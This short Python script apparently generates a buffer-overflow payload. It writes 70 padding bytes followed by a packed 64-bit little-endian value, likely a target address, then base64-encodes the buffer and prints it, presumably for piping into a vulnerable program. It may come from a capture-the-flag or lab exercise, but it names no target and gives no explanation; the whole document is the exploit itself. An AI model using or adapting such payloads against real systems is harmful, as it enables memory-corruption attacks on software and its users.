
import sys
import struct
import base64

buf = b'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG'
buf += struct.pack('<Q', 5415789307076193049)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
